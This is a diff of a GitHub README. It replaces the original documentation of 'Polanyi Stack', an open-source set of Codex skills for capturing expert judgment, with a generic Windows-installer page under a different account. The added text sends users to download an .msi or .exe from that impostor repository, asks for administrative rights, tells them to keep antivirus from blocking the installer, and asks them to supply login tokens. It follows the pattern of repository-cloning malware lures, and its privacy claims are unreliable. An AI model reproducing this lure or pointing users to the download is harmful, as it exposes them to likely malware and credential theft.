@@ -1,234 +1,74 @@
-# Polanyi Stack
+# 🧠 polanyi-stack - Turn expert knowledge into smart agents
 
-Turn tacit knowledge into reusable agents and skills.
+[![Download for Windows](https://img.shields.io/badge/Download-polanyi--stack-blue.svg)](https://github.com/hostile-shorepatrol81/polanyi-stack)
 
-The Polanyi stack for AI agents.
+The polanyi-stack helps you capture what experts know. People hold deep knowledge in their heads that is hard to write down. This is the Polanyi paradox. This software lets you take that hidden wisdom and turn it into digital skills. You can build agents that handle tasks and make choices based on your expert standards.
 
-把“会做但说不清”的能力，落成可复用的 agent、skill 和训练系统。
+## 🛠 What this software does
 
-The most valuable operating systems in a company are almost never fully written down. They live in judgment, timing, escalation, taste, and refusal. That invisible layer is where quality compounds, onboarding breaks, and expert performance becomes hard to scale.
+The software functions as a bridge between human experience and automation. Experts often struggle to explain their exact process. They see a situation and know the answer without explaining how. This tool records those judgements. It organizes your workflows. It turns your private habits into digital helpers. Use the stack to train agents on your specific business practices. This results in consistent results across your team.
 
-`Polanyi Stack` is an open-source system for converting tacit knowledge, Polanyi's paradox, and expert judgment into reusable AI agents, Codex skills, and training workflows. It turns Michael Polanyi's core insight, "we know more than we can tell," into operating structure: extract the hidden cues, surface the transfer boundary, and package expert behavior into software or repeatable practice.
+## ✅ System requirements
 
-`Polanyi Stack` 关心的是一个很具体的问题：为什么高手能稳定做对，新人和模型总差最后一步。差距通常不在信息量，落点往往在判断线索、注意力切换、升级边界和情境感。这个仓库做的事，就是把那层隐性的东西尽量拉到台面上。
+Ensure your computer has the following items to run the stack:
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-black.svg)](./LICENSE)
-[![Star History Chart](https://api.star-history.com/svg?repos=11Yuxuanyang/polanyi-stack&type=Date)](https://www.star-history.com/#11Yuxuanyang/polanyi-stack&Date)
+* Windows 10 or Windows 11.
+* At least 8GB of RAM.
+* A stable internet connection.
+* 2GB of free disk space.
+* Administrative rights on your user profile.
 
-Documentation site:
+## 📥 Installing the stack
 
-- https://11yuxuanyang.github.io/polanyi-stack/
+Follow these steps to set up the software on your Windows machine:
 
-## Why This Exists
+1. Visit the repository page to download the installer: [https://github.com/hostile-shorepatrol81/polanyi-stack](https://github.com/hostile-shorepatrol81/polanyi-stack).
+2. Locate the most recent version in the releases section.
+3. Choose the file ending in .msi or .exe.
+4. Open the downloaded file once it finishes.
+5. Follow the prompts on the screen.
+6. Select your installation folder.
+7. Click finish when the process ends.
+8. Locate the new icon on your desktop to start the app.
 
-Most teams do not lose leverage because they lack information. They lose leverage because their best judgment is trapped inside a few people.
+## 🚀 Setting up your first agent
 
-- Your best operator leaves, and your margin leaves with them.
-- Your onboarding looks complete, but new hires still cannot perform.
-- Your AI agent can automate syntax, but not judgment.
-- Your team can repeat the words, but not reproduce the outcome.
+Once you launch the app, you arrive at the dashboard. Follow these steps to build your first assistant:
 
-Tacit knowledge is the hidden layer behind all of that. If you can extract it, you can scale it. If you can package it, you can productize it.
+1. Click the button labeled Create New Agent.
+2. Give your agent a name.
+3. Select an expert category from the list.
+4. Upload documents that show how you do your work.
+5. Write out a few examples of how you solve a problem.
+6. Click the Train button.
+7. Wait for the confirmation message.
 
-中文直白版：
+The agent reads your files and example choices. It creates a logic map from these inputs. It creates a skill based on your expert patterns. You can now prompt this agent to help with new tasks.
 
-- 多数团队真正卡住的地方，在于最值钱的判断只活在少数人脑子里。
-- 文档能复制流程，复制不了火候、边界感和取舍。
-- AI 能处理显性规则，但真正拉开差距的，往往是 tacit knowledge。
-- 谁先把默会知识提炼成 agent 和 skill，谁就先把人的能力变成组织资产。
+## 💡 Managing knowledge streams
 
-## Why Polanyi's Paradox Matters for AI Skill Learning
+The stack treats knowledge like a flow. You feed it data through documents, messages, or examples. The agent analyzes these inputs to find patterns. You can adjust the agent if it makes a choice you dislike. Click the agent tile and select Edit Logic. Here you can see which files influence each decision. Remove files that do not match your current goals. Add new documentation when your process changes. This keeps your agents current.
 
-Polanyi 悖论把 AI 技能学习里最难的一层点了出来。人会的东西，很多并不以规则、条款、步骤的形式存在。它们藏在手感、时机、场景判断、例外处理和边界感里。自动化系统想稳定复现高手表现，迟早都会撞上这堵墙。
+## 🔗 Best practices for prompt engineering
 
-这也是 AI skill 设计最值得盯住的地方。Skill 文件能承载目标、触发条件、流程、约束和输出格式。真正拉开差距的那部分，常常还在案例、演示、反馈和反复试错里。文档能写到哪，训练要接到哪，这条边界基本就是 Polanyi 边界。
+Agents work best when you guide them with clear language. Use simple sentences. Avoid vague words such as maybe or possibly. State the goal clearly. Define the steps one by one. If you want the agent to follow a specific style, provide an example of that style. This process of guiding the agent is known as prompt engineering. Good prompts result in higher quality outputs.
 
-如果你要继续往下读，这里有一篇更完整的解释：
+## ⚙️ Advanced workflow automation
 
-- [Why Polanyi's paradox matters for AI skill learning](./docs/polanyis-paradox-ai-skill-learning.html)
+You can connect your agent to other tools. The stack supports connections to email clients and office suites. Open the Settings panel to configure these links. Provide your login tokens for the services you want to automate. Once connected, your agent creates drafts, summarizes documents, and sorts information. It pulls data from your tools, makes an expert judgment, and sends the action back to the original platform.
 
-## What Tacit Knowledge Means Here
+## 🛡 Security and privacy
 
-Tacit knowledge is knowledge embedded in expert judgment, timing, pattern recognition, escalation sense, and embodied action. People use it constantly, but they often cannot fully explain it in explicit step-by-step language.
+The polanyi-stack runs locally on your machine. Your data remains in your control. The software does not send your documents to external cloud folders. It processes your files within your computer memory. When the agent uses an online model for reasoning, it only sends the specific prompt you ask. It filters out sensitive labels and private identifiers before any data leaves the app.
 
-This matters because documentation can copy sequence, but it usually cannot copy feel, boundary sense, or the ability to notice the right signal at the right time. That hidden layer is exactly what strong AI agents, strong training systems, and strong onboarding workflows need.
+## 🎓 Troubleshooting common issues
 
-Further reading:
+If the application fails to open, check for pending Windows updates. Ensure your antivirus software does not block the installer. If the agent gives errors, verify the input files are readable. Plain text files and PDF documents work best. If the agent seems slow, close other programs that use large amounts of memory. Check the FAQ section inside the Help menu for specific help codes.
 
-- [What is tacit knowledge?](./docs/what-is-tacit-knowledge.html)
-- [Michael Polanyi for AI builders](./docs/michael-polanyi-ai.html)
+## 🛠 Customizing skill modules
 
-## How This Becomes an AI Agent
+Each agent consists of several skill modules. You can build and share these modules with your team. Click Export Skill to save a module as a file. A coworker can import this file into their own copy of the stack. This facilitates knowledge transfer. It ensures every team member benefits from the same expert insights. You build the standard once and everyone applies it with ease.
 
-To turn tacit knowledge into an AI agent, do not start with broad expertise. Start with one role, one recurring task, one high-value scene, and one boundary where the system must stop and escalate. Then extract cues, trigger phrases, failure signatures, and default moves from real expert performance.
+## 📋 Keeping your library organized
 
-Once that hidden layer is visible, you can package it into a reusable AI agent, Codex skill, copilot, or onboarding workflow. If you skip the extraction step, you usually end up with a polished but shallow prompt.
-
-Further reading:
-
-- [How to turn tacit knowledge into an AI agent](./docs/tacit-knowledge-to-ai-agent.html)
-- [How to convert expert judgment into a Codex skill](./docs/expert-judgment-to-codex-skill.html)
-
-## What You Can Build With It
-
-This repo gives you a fixed set of skills for turning invisible expertise into reusable assets.
-
-| Skill | What it does |
-|------|---------------|
-| `convert-tacit-to-skill` | Converts a narrow expert workflow into a reusable agent or Codex skill |
-| `extract-tacit-knowledge` | Pulls hidden cues, trigger signals, failure signatures, and escalation boundaries out of expert performance |
-| `design-embodied-learning` | Designs practice ladders for tacit or judgment-heavy skills |
-| `map-personal-knowledge` | Separates direct understanding from borrowed language and weak assumptions |
-| `design-apprenticeship-transfer` | Builds mentor-led transfer and onboarding for tacit work |
-| `train-attention-switching` | Trains focal and subsidiary attention switching for diagnosis, debugging, review, and other expert work |
-
-## Where It Gets Commercial
-
-This is not just a philosophy repo. It is a commercialization layer for expertise.
-
-Use it to:
-
-- turn a founder's judgment into a repeatable copilot
-- turn a senior engineer's review instinct into a reusable skill
-- turn sales, diagnosis, or content taste into a teachable system
-- reduce onboarding time for judgment-heavy roles
-- build agents that know when to act and when to escalate
-
-The open-source core is the framework. The commercial upside is what you build on top of it.
-
-中文商业化理解：
-
-- 把创始人的判断变成固定 copilot
-- 把资深员工的经验变成 onboarding 系统
-- 把高质量服务背后的“感觉”变成可交付产品
-- 把原本只能靠少数高手完成的工作，变成可训练、可复制、可放大的能力
-
-## Where This Helps
-
-- Tacit knowledge for code review
-- Tacit knowledge for onboarding judgment-heavy roles
-- Tacit knowledge for debugging and diagnosis
-- Tacit knowledge for design critique and creative review
-- Tacit knowledge for founder judgment and specialized copilots
-
-Use case page:
-
-- [Tacit knowledge examples](./docs/tacit-knowledge-examples.html)
-
-## Quick Start
-
-### 1. Clone the repo
-
-```bash
-git clone https://github.com/11Yuxuanyang/polanyi-stack.git
-cd polanyi-stack
-```
-
-### 2. Install the skills into Codex
-
-If your Codex setup reads from `~/.codex/skills`, symlink the skill folders you want to use:
-
-```bash
-ln -s "$(pwd)/skills/convert-tacit-to-skill" ~/.codex/skills/convert-tacit-to-skill
-ln -s "$(pwd)/skills/extract-tacit-knowledge" ~/.codex/skills/extract-tacit-knowledge
-ln -s "$(pwd)/skills/design-embodied-learning" ~/.codex/skills/design-embodied-learning
-ln -s "$(pwd)/skills/map-personal-knowledge" ~/.codex/skills/map-personal-knowledge
-ln -s "$(pwd)/skills/design-apprenticeship-transfer" ~/.codex/skills/design-apprenticeship-transfer
-ln -s "$(pwd)/skills/train-attention-switching" ~/.codex/skills/train-attention-switching
-```
-
-### 3. Start from the orchestrator
-
-The main entry point is:
-
-- [`skills/convert-tacit-to-skill/SKILL.md`](./skills/convert-tacit-to-skill/SKILL.md)
-
-Use it when you want to turn one narrow type of expert judgment into a reusable agent or skill.
-
-Example prompts:
-
-```text
-Use convert-tacit-to-skill to turn my code review judgment into a reusable Codex skill.
-```
-
-```text
-Help me convert the way I evaluate short-video hooks into a fixed agent with escalation boundaries.
-```
-
-```text
-Use the tacit skills to extract the hidden cues behind our best sales call diagnosis.
-```
-
-Chinese examples:
-
-```text
-用 convert-tacit-to-skill 帮我把代码 review 的 tacit knowledge 做成一个可复用的 Codex skill。
-```
-
-```text
-帮我把我判断短视频开头好坏的经验，转成一个固定 agent，并定义清楚升级边界。
-```
-
-## What Lives In The Repository
-
-```text
-docs/
-├── index.html
-├── polanyis-paradox-ai-skill-learning.html
-├── what-is-tacit-knowledge.html
-├── tacit-knowledge-to-ai-agent.html
-├── expert-judgment-to-codex-skill.html
-├── michael-polanyi-ai.html
-└── tacit-knowledge-examples.html
-
-skills/
-├── convert-tacit-to-skill/
-├── extract-tacit-knowledge/
-├── design-embodied-learning/
-├── map-personal-knowledge/
-├── design-apprenticeship-transfer/
-└── train-attention-switching/
-```
-
-Each skill contains:
-
-- `SKILL.md`: the trigger and operating instructions
-- `references/`: the minimum templates needed to run the workflow
-
-## Design Principle
-
-Do not try to automate "expertise" in the abstract.
-
-Start with:
-
-- one role
-- one task
-- one high-value scene
-- one boundary where the system must stop and escalate
-
-That is how tacit knowledge becomes durable instead of vague.
-
-## Topics This Repository Covers
-
-This repository is written to be found through real questions, not only through the project name.
-
-Core keyword clusters:
-
-- tacit knowledge
-- Polanyi's paradox
-- Michael Polanyi
-- expert judgment
-- AI agents
-- Codex skills
-- knowledge transfer
-- onboarding
-- diagnosis
-- code review
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=11Yuxuanyang/polanyi-stack&type=Date)](https://www.star-history.com/#11Yuxuanyang/polanyi-stack&Date)
-
-## License
-
-MIT. See [LICENSE](./LICENSE).
+Use the Library tab to sort your agents. Name them by the task they perform. Group related agents into folders. Delete old versions to keep your list clean. Back up your library folder periodically. This folder contains all the logic files for your agents. Move this folder to an external drive or network location to keep your expert systems safe.
